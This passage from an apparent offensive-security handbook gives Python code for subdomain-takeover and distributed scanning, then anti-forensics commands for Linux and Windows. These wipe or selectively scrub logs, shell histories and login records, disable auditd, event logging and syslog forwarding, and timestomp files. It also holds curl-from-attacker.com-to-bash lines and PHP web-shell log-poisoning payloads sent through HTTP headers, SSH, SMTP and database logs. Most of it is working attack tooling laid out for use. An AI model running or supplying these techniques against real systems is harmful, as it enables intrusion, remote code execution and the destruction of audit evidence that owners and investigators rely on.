            'cname': ['azurewebsites.net', 'cloudapp.net'],
            'response': ['404 Web Site not found'],
            'status': [404]
        },
        'bitbucket': {
            'cname': ['bitbucket.io'],
            'response': ['Repository not found'],
            'status': [404]
        },
        'shopify': {
            'cname': ['myshopify.com'],
            'response': ['Sorry, this shop is currently unavailable'],
            'status': [404]
        },
        'wordpress': {
            'cname': ['wordpress.com'],
            'response': ['Do you want to register'],
            'status': [404]
        },
        'pantheon': {
            'cname': ['pantheonsite.io'],
            'response': ['404 error unknown site'],
            'status': [404]
        },
        'tumblr': {
            'cname': ['tumblr.com'],
            'response': ['There\'s nothing here.', 'Whatever you were looking for doesn\'t currently exist'],
            'status': [404]
        },
        'fastly': {
            'cname': ['fastly.net'],
            'response': ['Fastly error: unknown domain'],
            'status': [404]
        }
    }
    
    def __init__(self, subdomains: List[str], concurrency=50):
        self.subdomains = subdomains
        self.concurrency = concurrency
        self.results = []
        self.semaphore = asyncio.Semaphore(concurrency)
    
    async def resolve_cname(self, domain):
        """Resolve CNAME records for domain"""
        try:
            resolver = aiodns.DNSResolver()
            result = await resolver.query(domain, 'CNAME')
            if result:
                return result[0].host
        except:
            pass
        return None
    
    async def fetch_http(self, session, url):
        """Fetch HTTP response"""
        try:
            async with self.semaphore:
                async with session.get(url, timeout=10, allow_redirects=True) as response:
                    text = await response.text()
                    return {
                        'status': response.status,
                        'body': text.lower(),
                        'url': str(response.url)
                    }
        except Exception as e:
            return {'error': str(e)}
    
    async def check_subdomain(self, session, subdomain):
        """Check if subdomain is vulnerable to takeover"""
        print(f"[*] Checking {subdomain}")
        
        # Resolve CNAME
        cname = await self.resolve_cname(subdomain)
        
        if not cname:
            return None
        
        # Check against fingerprints
        for service, fingerprint in self.FINGERPRINTS.items():
            # Check if CNAME matches service
            cname_match = any(pattern in cname.lower() for pattern in fingerprint['cname'])
            
            if cname_match:
                # Fetch HTTP response
                for protocol in ['https', 'http']:
                    url = f"{protocol}://{subdomain}"
                    result = await self.fetch_http(session, url)
                    
                    if 'body' in result:
                        # Check response patterns
                        response_match = any(
                            pattern.lower() in result['body'] 
                            for pattern in fingerprint['response']
                        )
                        
                        status_match = result['status'] in fingerprint['status']
                        
                        if response_match and status_match:
                            return {
                                'subdomain': subdomain,
                                'cname': cname,
                                'service': service,
                                'status': result['status'],
                                'vulnerable': True,
                                'severity': 'high'
                            }
        
        return None
    
    async def scan_all(self):
        """Scan all subdomains"""
        connector = aiohttp.TCPConnector(limit=self.concurrency, ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [self.check_subdomain(session, sub) for sub in self.subdomains]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if result and isinstance(result, dict):
                    self.results.append(result)
                    print(f"[!] VULNERABLE: {result['subdomain']} -> {result['service']}")
        
        return self.results
    
    def save_results(self, output_file):
        """Save results to file"""
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n[✓] Scan complete!")
        print(f"[*] Vulnerable subdomains: {len(self.results)}")
        print(f"[*] Results saved to: {output_file}")


async def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Subdomain Takeover Scanner')
    parser.add_argument('-s', '--subdomains', required=True, help='File with subdomains')
    parser.add_argument('-o', '--output', default='takeover_results.json', help='Output file')
    parser.add_argument('-c', '--concurrency', type=int, default=50, help='Concurrency')
    
    args = parser.parse_args()
    
    with open(args.subdomains, 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Loaded {len(subdomains)} subdomains")
    print(f"[*] Starting scan...\n")
    
    scanner = SubdomainTakeoverScanner(subdomains, concurrency=args.concurrency)
    await scanner.scan_all()
    scanner.save_results(args.output)


if __name__ == "__main__":
    asyncio.run(main())
```

**Usage:**

```bash
# Run takeover scan
python3 subdomain_takeover.py -s subdomains.txt -o takeover_results.json

# Integrate with subdomain enumeration
subfinder -d target.com -silent | python3 subdomain_takeover.py -s /dev/stdin -o results.json
```

### Distributed Scanning with Multiple Machines

**Master-worker distributed scanner:**

```python
#!/usr/bin/env python3
# distributed_scanner_master.py

import asyncio
import json
from aiohttp import web
import aioredis
from datetime import datetime

class ScanMaster:
    
    def __init__(self, redis_host='localhost', redis_port=6379):
        self.redis = None
        self.redis_host = redis_host
        self.redis_port = redis_port
        self.results = []
    
    async def init_redis(self):
        """Initialize Redis connection"""
        self.redis = await aioredis.create_redis_pool(
            f'redis://{self.redis_host}:{self.redis_port}'
        )
    
    async def add_targets(self, targets):
        """Add targets to work queue"""
        for target in targets:
            await self.redis.lpush('scan_queue', json.dumps({
                'target': target,
                'added': datetime.now().isoformat()
            }))
        
        print(f"[*] Added {len(targets)} targets to queue")
    
    async def get_results(self):
        """Retrieve results from Redis"""
        results = []
        while True:
            result = await self.redis.rpop('scan_results')
            if not result:
                break
            results.append(json.loads(result))
        return results
    
    async def handle_worker_register(self, request):
        """Handle worker registration"""
        data = await request.json()
        worker_id = data.get('worker_id')
        
        await self.redis.sadd('active_workers', worker_id)
        print(f"[+] Worker registered: {worker_id}")
        
        return web.json_response({'status': 'registered'})
    
    async def handle_get_task(self, request):
        """Provide task to worker"""
        task = await self.redis.rpop('scan_queue')
        
        if task:
            return web.json_response({
                'status': 'ok',
                'task': json.loads(task)
            })
        else:
            return web.json_response({
                'status': 'no_tasks'
            })
    
    async def handle_submit_result(self, request):
        """Receive result from worker"""
        data = await request.json()
        
        await self.redis.lpush('scan_results', json.dumps(data))
        print(f"[+] Result received from {data.get('worker_id')}")
        
        return web.json_response({'status': 'received'})
    
    async def handle_status(self, request):
        """Get scan status"""
        queue_size = await self.redis.llen('scan_queue')
        results_count = await self.redis.llen('scan_results')
        workers = await self.redis.smembers('active_workers')
        
        return web.json_response({
            'queue_size': queue_size,
            'results_count': results_count,
            'active_workers': len(workers),
            'workers': [w.decode() for w in workers]
        })
    
    def start_server(self, host='0.0.0.0', port=8080):
        """Start master server"""
        app = web.Application()
        app.router.add_post('/register', self.handle_worker_register)
        app.router.add_get('/task', self.handle_get_task)
        app.router.add_post('/result', self.handle_submit_result)
        app.router.add_get('/status', self.handle_status)
        
        web.run_app(app, host=host, port=port)


# Worker script
"""
#!/usr/bin/env python3
# distributed_scanner_worker.py

import asyncio
import aiohttp
import uuid
import json

class ScanWorker:
    
    def __init__(self, master_url, worker_id=None):
        self.master_url = master_url
        self.worker_id = worker_id or str(uuid.uuid4())
    
    async def register(self):
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{self.master_url}/register",
                json={'worker_id': self.worker_id}
            ) as response:
                return await response.json()
    
    async def get_task(self):
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{self.master_url}/task") as response:
                return await response.json()
    
    async def submit_result(self, result):
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{self.master_url}/result",
                json={
                    'worker_id': self.worker_id,
                    'result': result
                }
            ) as response:
                return await response.json()
    
    async def scan_target(self, target):
        # Implement actual scanning logic here
        # This is a placeholder
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(target, timeout=10) as response:
                    return {
                        'target': target,
                        'status': response.status,
                        'headers': dict(response.headers)
                    }
            except Exception as e:
                return {
                    'target': target,
                    'error': str(e)
                }
    
    async def run(self):
        await self.register()
        print(f"[*] Worker {self.worker_id} registered")
        
        while True:
            task_response = await self.get_task()
            
            if task_response['status'] == 'no_tasks':
                print("[*] No tasks available, waiting...")
                await asyncio.sleep(5)
                continue
            
            task = task_response['task']
            print(f"[*] Processing: {task['target']}")
            
            result = await self.scan_target(task['target'])
            await self.submit_result(result)
            
            print(f"[✓] Completed: {task['target']}")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 distributed_scanner_worker.py <master_url>")
        sys.exit(1)
    
    master_url = sys.argv[1]
    worker = ScanWorker(master_url)
    asyncio.run(worker.run())
"""
```

**Usage:**

```bash
# Start Redis
docker run -d -p 6379:6379 redis

# Start master
python3 distributed_scanner_master.py

# On multiple machines, start workers
python3 distributed_scanner_worker.py http://master-ip:8080

# Add targets to queue (from master)
curl -X POST http://localhost:8080/add_targets \
    -H "Content-Type: application/json" \
    -d '{"targets": ["http://target1.com", "http://target2.com"]}'

# Check status
curl http://localhost:8080/status
```

## Key Takeaways & Best Practices

**Scraping efficiency:**

1. Use asyncio/aiohttp for I/O-bound operations
2. Implement rate limiting to avoid detection/blocking
3. Rotate user agents and use proxies when necessary
4. Handle errors gracefully with retries
5. Save intermediate results to resume interrupted scans

**Reconnaissance methodology:**

1. Start passive (DNS, certificates, search engines)
2. Move to active (probing, directory enumeration)
3. Analyze discovered assets (JS, APIs, forms)
4. Identify vulnerabilities systematically
5. Prioritize findings by severity and exploitability

**Mass scanning considerations:**

1. Respect rate limits and target resources
2. Use distributed scanning for large-scale operations
3. Implement proper error handling and logging
4. Save results in structured format (JSON) for analysis
5. Validate findings to reduce false positives

**Automation tips:**

1. Chain tools together with pipes and scripts
2. Use parallel processing for speed
3. Implement progress tracking for long scans
4. Create modular, reusable components
5. Document workflows for reproducibility

**Important related topics:**

- **CI/CD Integration**: Automating security scans in pipelines
- **Custom Wordlist Generation**: Building targeted dictionaries from target data
- **Machine Learning for Anomaly Detection**: Identifying unusual patterns in large datasets
- **Report Generation & Visualization**: Converting raw scan data into actionable intelligence

---

# Logging, Monitoring & Forensics

## Log Manipulation and Deletion

### Understanding Log Locations

**Linux System Logs:**

```bash
# Primary system logs
/var/log/syslog          # Debian/Ubuntu system logs
/var/log/messages        # RHEL/CentOS system logs
/var/log/auth.log        # Debian/Ubuntu authentication logs
/var/log/secure          # RHEL/CentOS authentication logs
/var/log/kern.log        # Kernel logs
/var/log/dmesg           # Boot messages
/var/log/cron            # Cron job logs
/var/log/maillog         # Mail server logs
/var/log/boot.log        # System boot logs

# Application-specific logs
/var/log/apache2/        # Apache web server (Debian/Ubuntu)
/var/log/httpd/          # Apache web server (RHEL/CentOS)
/var/log/nginx/          # Nginx web server
/var/log/mysql/          # MySQL database
/var/log/postgresql/     # PostgreSQL database
/var/log/fail2ban.log    # Fail2ban intrusion prevention

# User activity
/var/log/wtmp            # Login records (binary)
/var/log/btmp            # Failed login attempts (binary)
/var/log/lastlog         # Last login per user (binary)
~/.bash_history          # User command history
~/.zsh_history           # Zsh command history
~/.mysql_history         # MySQL command history
```

**Windows System Logs:**

```powershell
# Event logs location
C:\Windows\System32\winevt\Logs\

# Key log files:
Application.evtx         # Application events
Security.evtx            # Security/audit events
System.evtx              # System events
Microsoft-Windows-PowerShell%4Operational.evtx

# IIS logs
C:\inetpub\logs\LogFiles\

# Additional logs
C:\Windows\System32\LogFiles\
C:\Windows\Temp\
```

### Linux Log Deletion Techniques

**Simple Deletion:**

```bash
# Delete specific log files (requires root/sudo)
rm -f /var/log/auth.log
rm -f /var/log/apache2/access.log
rm -f /var/log/nginx/access.log

# Delete all logs in directory
rm -rf /var/log/apache2/*
rm -rf /var/log/nginx/*

# Delete with overwrite (more secure deletion)
shred -vfz -n 10 /var/log/auth.log
shred -vfz -n 10 /var/log/apache2/access.log

# Wipe using dd
dd if=/dev/zero of=/var/log/auth.log bs=1M count=10
dd if=/dev/urandom of=/var/log/secure bs=1M count=10
```

**Truncating Logs (maintains file):**

```bash
# Truncate to zero size (keeps file, clears content)
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/apache2/access.log

# Using redirection
> /var/log/auth.log
echo -n > /var/log/auth.log
cat /dev/null > /var/log/auth.log

# Using dd
dd if=/dev/null of=/var/log/auth.log
```

**Selective Log Deletion:**

```bash
# Remove specific entries by pattern
sed -i '/10.10.14.5/d' /var/log/apache2/access.log
sed -i '/attacker_username/d' /var/log/auth.log
sed -i '/failed password/d' /var/log/secure

# Remove lines containing attacker IP
grep -v '10.10.14.5' /var/log/auth.log > /tmp/cleaned.log
mv /tmp/cleaned.log /var/log/auth.log

# Remove entries within time range
awk '!/Nov 15 14:3[0-5]/' /var/log/syslog > /tmp/cleaned.log
mv /tmp/cleaned.log /var/log/syslog

# Delete last N lines
head -n -100 /var/log/auth.log > /tmp/cleaned.log
mv /tmp/cleaned.log /var/log/auth.log
```

**Binary Log Manipulation:**

```bash
# wtmp (login records) - binary format
# View wtmp
last -f /var/log/wtmp

# Clear wtmp entirely
echo -n > /var/log/wtmp

# Remove specific user entries
# Install utmpdump if not available
apt-get install sysvinit-utils

# Dump to text, edit, restore
utmpdump /var/log/wtmp > /tmp/wtmp.txt
grep -v "attacker_user" /tmp/wtmp.txt > /tmp/wtmp_clean.txt
utmpdump -r < /tmp/wtmp_clean.txt > /var/log/wtmp
rm /tmp/wtmp*.txt

# btmp (failed logins)
echo -n > /var/log/btmp

# lastlog (last login per user)
echo -n > /var/log/lastlog
```

**Command History Manipulation:**

```bash
# Clear bash history for current user
history -c
history -w
> ~/.bash_history
echo "" > ~/.bash_history
cat /dev/null > ~/.bash_history

# Delete specific command from history
history | grep "sensitive_command"  # Find line number
history -d 1234  # Delete line 1234
history -w       # Write to file

# Prevent command from being logged (leading space)
 sensitive_command_here
 cat /etc/shadow

# Disable history for session
unset HISTFILE
export HISTSIZE=0

# Make history file read-only (defensive)
chmod 000 ~/.bash_history
chattr +i ~/.bash_history  # Immutable

# Clear other shell histories
> ~/.zsh_history
> ~/.mysql_history
> ~/.python_history
> ~/.psql_history
```

**Automated Log Cleaning Script:**

```bash
#!/bin/bash
# log_cleaner.sh - Remove traces

# Clear authentication logs
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/auth.log.1
truncate -s 0 /var/log/secure

# Clear web server logs
truncate -s 0 /var/log/apache2/access.log
truncate -s 0 /var/log/apache2/error.log
truncate -s 0 /var/log/nginx/access.log
truncate -s 0 /var/log/nginx/error.log

# Clear system logs
truncate -s 0 /var/log/syslog
truncate -s 0 /var/log/messages

# Clear login records
echo -n > /var/log/wtmp
echo -n > /var/log/btmp
echo -n > /var/log/lastlog

# Clear command histories
history -c
cat /dev/null > ~/.bash_history

# Clear other common histories
for user_home in /home/*; do
    [ -f "$user_home/.bash_history" ] && cat /dev/null > "$user_home/.bash_history"
    [ -f "$user_home/.zsh_history" ] && cat /dev/null > "$user_home/.zsh_history"
done

echo "Logs cleaned"
```

**Covering Tracks with Timestamps:**

```bash
# View file timestamps
stat /var/log/auth.log

# Modify file timestamps to match another file
touch -r /var/log/syslog /var/log/auth.log

# Set specific timestamp
touch -t 202401150830.00 /var/log/auth.log  # Jan 15, 2024 08:30:00

# Restore timestamps after modification
# Save original timestamps
stat /var/log/auth.log > /tmp/original_stat.txt

# Modify file
sed -i '/attacker/d' /var/log/auth.log

# Restore access/modification times
touch -d "2024-01-15 08:30:00" /var/log/auth.log
```

### Windows Log Deletion Techniques

**Event Log Clearing (Command Line):**

```cmd
REM Clear specific event logs
wevtutil cl Application
wevtutil cl Security
wevtutil cl System
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

REM Clear all event logs
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
```

**PowerShell Event Log Clearing:**

```powershell
# Clear specific logs
Clear-EventLog -LogName Application
Clear-EventLog -LogName Security
Clear-EventLog -LogName System

# Clear all classic event logs
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }

# Clear Windows Event Logs (newer format)
wevtutil el | ForEach-Object {wevtutil cl "$_"}

# Remove specific event by ID
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Remove-Item

# Clear logs silently (suppress confirmation)
Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
```

**Selective Event Removal (PowerShell):**

```powershell
# Export log
wevtutil epl Security C:\temp\security_backup.evtx

# Clear original
wevtutil cl Security

# Reimport filtered events (requires custom filtering)
# This is complex and often detectable - direct file manipulation preferred
```

**Delete Log Files Directly:**

```cmd
REM Stop Event Log service (requires admin)
net stop eventlog

REM Delete log files
del C:\Windows\System32\winevt\Logs\Application.evtx
del C:\Windows\System32\winevt\Logs\Security.evtx
del C:\Windows\System32\winevt\Logs\System.evtx

REM Restart service
net start eventlog
```

**PowerShell History Deletion:**

```powershell
# Clear PowerShell command history (current session)
Clear-History

# Delete PowerShell history file
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Typical locations:
# C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Disable history for session
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

**IIS Log Deletion:**

```cmd
REM Default IIS log location
cd C:\inetpub\logs\LogFiles\W3SVC1\

REM Delete logs
del *.log

REM Or selective deletion
del /Q /F u_ex*.log
```

**Registry Modifications to Disable Logging:**

```cmd
REM Disable Security event logging (DANGEROUS - highly detectable)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /v Start /t REG_DWORD /d 4 /f

REM Disable Application logging
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application" /v Start /t REG_DWORD /d 4 /f

REM Disable PowerShell script block logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f

REM Disable PowerShell transcription
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 0 /f
```

### Covering Network Connection Logs

**Linux Network Connections:**

```bash
# View active connections
netstat -antp
ss -antp

# Clear connection tracking (requires root)
conntrack -F  # Flush all connection tracking entries

# Disable logging for specific iptables rules
iptables -D INPUT -j LOG  # Remove LOG target

# Clear iptables logs
> /var/log/kern.log
```

**Windows Network Connections:**

```powershell
# View connections
netstat -ano
Get-NetTCPConnection

# Clear DNS cache (removes DNS query history)
ipconfig /flushdns
Clear-DnsClientCache

# Clear ARP cache
arp -d *
Get-NetNeighbor | Remove-NetNeighbor -Confirm:$false
```

### Syslog Tampering

**Stop Syslog Service:**

```bash
# Systemd-based systems
systemctl stop rsyslog
systemctl stop syslog-ng

# Traditional init
service rsyslog stop
service syslog stop

# Clean logs while service stopped
truncate -s 0 /var/log/syslog
truncate -s 0 /var/log/auth.log

# Restart service
systemctl start rsyslog
```

**Remote Syslog Disruption:**

```bash
# If system sends logs to remote syslog server
# Block outbound syslog traffic (port 514)
iptables -A OUTPUT -p udp --dport 514 -j DROP
iptables -A OUTPUT -p tcp --dport 514 -j DROP

# Redirect syslog to /dev/null (rsyslog.conf)
echo "*.* /dev/null" >> /etc/rsyslog.conf
systemctl restart rsyslog
```

### Log Rotation Exploitation

**Trigger Premature Rotation:**

```bash
# Force log rotation to move current logs
logrotate -f /etc/logrotate.conf

# Logs are moved to .1, .2, etc.
# Delete rotated logs
rm /var/log/auth.log.*
rm /var/log/apache2/access.log.*

# New log file created, old entries gone
```

**Modify Logrotate Configuration:**

```bash
# Edit logrotate config
nano /etc/logrotate.d/rsyslog

# Reduce retention
/var/log/auth.log {
    rotate 0        # Keep zero old logs
    daily
    missingok
    notifempty
}

# Force rotation
logrotate -f /etc/logrotate.d/rsyslog
```

### Audit System Manipulation (Linux)

**Auditd Log Clearing:**

```bash
# Check auditd status
systemctl status auditd
auditctl -l  # List rules

# Stop auditd
systemctl stop auditd

# Clear audit logs
truncate -s 0 /var/log/audit/audit.log
rm /var/log/audit/audit.log.*

# Disable auditd rules
auditctl -D  # Delete all rules

# Restart
systemctl start auditd
```

**Disable Auditd:**

```bash
# Disable service
systemctl disable auditd
systemctl stop auditd

# Or modify kernel parameter
# Edit /etc/default/grub
GRUB_CMDLINE_LINUX="audit=0"
update-grub
reboot
```

### Advanced Anti-Forensics

**File System Journal Manipulation:**

```bash
# [Unverified] Some techniques attempt to manipulate filesystem journals
# ext4 journal dumping (informational only)
debugfs -R "logdump -a" /dev/sda1

# Disable journaling (destructive, requires unmount)
tune2fs -O ^has_journal /dev/sda1

# This is highly detectable and may cause data loss
```

**Memory-Only Operations:**

```bash
# Execute commands without disk writes
# Load script into memory, execute from RAM
curl http://attacker.com/script.sh | bash

# Or using process substitution
bash <(curl -s http://attacker.com/script.sh)

# Store data in tmpfs (RAM disk)
mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk
cd /mnt/ramdisk
# Operate from here - cleared on reboot
```

**Timestomp (Windows):**

```powershell
# Modify file timestamps using PowerShell
$file = Get-Item "C:\suspicious_file.txt"
$file.CreationTime = "01/01/2020 12:00:00"
$file.LastWriteTime = "01/01/2020 12:00:00"
$file.LastAccessTime = "01/01/2020 12:00:00"

# Using external tool (Metasploit timestomp)
# In meterpreter:
timestomp C:\\suspicious_file.txt -m "01/01/2020 12:00:00"
timestomp C:\\suspicious_file.txt -c "01/01/2020 12:00:00"
timestomp C:\\suspicious_file.txt -a "01/01/2020 12:00:00"
```

## Log Poisoning

### Concept

Log poisoning involves injecting malicious content into log files that gets executed when logs are viewed or processed, typically through web-based log viewers, intrusion detection systems, or administrative scripts.

### Apache/Nginx Access Log Poisoning

**Basic PHP Log Poisoning:**

```bash
# Inject PHP code via User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.ctf/

# Access log now contains:
# 10.10.14.5 - - [15/Nov/2024:10:30:00] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"

# If log file is accessible via web and PHP is enabled:
http://target.ctf/../../var/log/apache2/access.log?cmd=whoami

# Alternative injection points
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" http://target.ctf/
curl "http://target.ctf/<?php system(\$_GET['cmd']); ?>"
```

**URL-Encoded PHP Injection:**

```bash
# Inject via URL path
curl "http://target.ctf/%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E"

# Decoded: <?php system($_GET['cmd']); ?>
```

**Multi-line PHP Injection:**

```bash
# Complex payload with output buffering
PAYLOAD='<?php ob_start(); system($_GET["cmd"]); $output = ob_get_clean(); echo "<pre>$output</pre>"; ?>'

curl -A "$PAYLOAD" http://target.ctf/

# Access
http://target.ctf/../../var/log/apache2/access.log?cmd=id
```

**Nginx Log Poisoning:**

```bash
# Similar technique for Nginx
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.ctf/

# Nginx default log locations:
# /var/log/nginx/access.log
# /var/log/nginx/error.log

# Access via LFI
http://target.ctf/index.php?page=../../var/log/nginx/access.log&cmd=whoami
```

### SSH Log Poisoning

**auth.log Poisoning (Linux):**

```bash
# Attempt SSH login with username containing PHP code
ssh '<?php system($_GET["cmd"]); ?>'@target.ctf

# auth.log records failed authentication with username
# Example log entry:
# Nov 15 10:30:00 target sshd[1234]: Failed password for <?php system($_GET["cmd"]); ?> from 10.10.14.5

# Access via LFI
http://target.ctf/index.php?page=../../var/log/auth.log&cmd=id

# Alternative payloads
ssh '<?=system($_GET[c]);?>'@target.ctf
ssh '<?=`$_GET[c]`;?>'@target.ctf
```

**Encoded SSH Poisoning:**

```bash
# Base64 encoded payload
PAYLOAD=$(echo -n '<?php system($_GET["cmd"]); ?>' | base64)
ssh "$PAYLOAD"@target.ctf

# Access and decode
http://target.ctf/lfi.php?page=../../var/log/auth.log
```

### FTP Log Poisoning

**vsftpd Log Poisoning:**

```bash
# Login with malicious username
ftp target.ctf
# Username: <?php system($_GET["cmd"]); ?>
# Password: anything

# Log location (typically):
# /var/log/vsftpd.log
# /var/log/xferlog

# Access via LFI
http://target.ctf/index.php?page=../../var/log/vsftpd.log&cmd=whoami
```

### SMTP Log Poisoning

**Mail Log Injection:**

```bash
# Send email with PHP payload
telnet target.ctf 25
EHLO attacker.com
MAIL FROM: <?php system($_GET["cmd"]); ?>
RCPT TO: user@target.ctf
DATA
Subject: Test
<?php system($_GET["cmd"]); ?>
.
QUIT

# Mail logs contain PHP code:
# /var/log/mail.log
# /var/log/maillog

# Access via LFI
http://target.ctf/index.php?page=../../var/log/mail.log&cmd=id
```

**Python SMTP Poisoning Script:**

```python
#!/usr/bin/env python3
import smtplib

payload = '<?php system($_GET["cmd"]); ?>'

msg = f"""From: {payload}
To: user@target.ctf
Subject: Test

{payload}
"""

server = smtplib.SMTP('target.ctf', 25)
server.sendmail(payload, 'user@target.ctf', msg)
server.quit()
```

### HTTP Request Header Poisoning

**All HTTP Headers as Injection Vectors:**

```bash
# User-Agent (most common)
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.ctf/

# Referer
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" http://target.ctf/

# X-Forwarded-For
curl -H "X-Forwarded-For: <?php system(\$_GET['cmd']); ?>" http://target.ctf/

# Cookie
curl -H "Cookie: session=<?php system(\$_GET['cmd']); ?>" http://target.ctf/

# Accept-Language
curl -H "Accept-Language: <?php system(\$_GET['cmd']); ?>" http://target.ctf/

# Custom headers
curl -H "X-Custom: <?php system(\$_GET['cmd']); ?>" http://target.ctf/
```

### Database Query Log Poisoning

**MySQL General Log Poisoning:**

```bash
# Enable general log (logs all queries)
mysql -u root -p
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/mysql.php';

# Execute query with PHP payload
SELECT '<?php system($_GET["cmd"]); ?>';

# Access the log file
http://target.ctf/mysql.php?cmd=whoami
```

**PostgreSQL Log Poisoning:**

```bash
# Connect to PostgreSQL
psql -U postgres

# Execute command that gets logged
DO $$BEGIN RAISE NOTICE '<?php system($_GET["cmd"]); ?>'; END$$;

# Or using COPY
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/pg.php';
```

### Proc Self Environ Poisoning

**Technique:** Inject code into /proc/self/environ via User-Agent, then include /proc/self/environ.

```bash
# Inject via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.ctf/

# Access via LFI
http://target.ctf/index.php?page=../../proc/self/environ&cmd=id

# /proc/self/environ contains HTTP_USER_AGENT with PHP code
```

### Session File Poisoning

**PHP Session Poisoning:**

```bash
# PHP stores sessions in files (default: /var/lib/php/sessions/)
# Session filename format: sess_<session_id>

# Set malicious session data
curl -b "PHPSESSID=attacker123" -d "name=<?php system(\$_GET['cmd']); ?>" http://target.ctf/profile.php

# Session file /var/lib/php/sessions/sess_attacker123 contains:
# name|s:29:"<?php system($_GET['cmd']); ?>";

# Access via LFI
http://target.ctf/index.php?page=../../var/lib/php/sessions/sess_attacker123&cmd=id
```

### Error Log Poisoning

**Trigger Errors with Malicious Input:**

```bash
# PHP error logs may include user input
# Trigger error with PHP code in parameter
curl "http://target.ctf/index.php?page=<?php system(\$_GET['cmd']); ?>"

# Error logged:
# PHP Warning: include(<?php system($_GET['cmd']); ?>): failed to open stream

# Access error log
http://target.ctf/index.php?page=../../var/log/apache2/error.log&cmd=whoami
```

### WAF/IDS Log Poisoning

**[Inference] Security device logs may execute injected code if viewed through web interfaces. Testing requires specific knowledge of the log viewing mechanism.**

```bash
# Inject XSS/command into attack payload
curl -A "<script>alert('XSS')</script>" http://target.ctf/admin

# If WAF logs are viewed via web interface, XSS triggers
# Command injection similar principle for log analysis tools
```

### Automated Log Poisoning Tools

**wfuzz for Log Poisoning:**

```bash
# Fuzz User-Agent with payloads
wfuzz -c -z file,php_payloads.txt -H "User-Agent: FUZZ" http://target.ctf/

# php_payloads.txt contains:
# <?php system($_GET['cmd']); ?>
# <?=`$_GET[c]`?>
# <?=system($_GET[0]);?>
```

**Burp Suite for Log Poisoning:**

```
1. Capture request in Burp Proxy
2. Send to Repeater
3. Modify User-Agent: <?php system($_GET['cmd']); ?>
4. Send request
5. Access log via LFI vulnerability
```

## Clearing Browser History and Artifacts

### Understanding Browser Artifacts

**Windows Browser Locations:**

```
Chrome:
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\
- History (SQLite database)
- Cache (various files)
- Cookies (SQLite)
- Login Data (SQLite)

Firefox:
C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<random>.default\
- places.sqlite (history and bookmarks)
- cookies.sqlite
- formhistory.sqlite
- cache2\entries\

Edge:
C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default\
- Similar structure to Chrome

Internet Explorer:
C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\
C:\Users\<username>\AppData\Local\Microsoft\Windows\History\
```

**Linux Browser Locations:**

```
Chrome:
~/.config/google-chrome/Default/
- History
- Cookies
- Cache

Firefox:
~/.mozilla/firefox/<random>.default/
- places.sqlite
- cookies.sqlite
- cache2/

```

### Windows Browser Cleanup

**Command Line Browser Data Deletion:**

```cmd
REM Chrome
rd /s /q "%LOCALAPPDATA%\Google\Chrome\User Data"

REM Firefox
rd /s /q "%APPDATA%\Mozilla\Firefox\Profiles"

REM Edge
rd /s /q "%LOCALAPPDATA%\Microsoft\Edge\User Data"

REM Internet Explorer
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8    REM Cookies
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2    REM History
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1    REM Temp files
```

**PowerShell Browser Cleanup:**

```powershell
# Chrome history
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -ErrorAction SilentlyContinue

# Chrome cache
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue

# Chrome cookies
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" -ErrorAction SilentlyContinue

# Firefox history
$firefoxProfile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\" | Select-Object -First 1
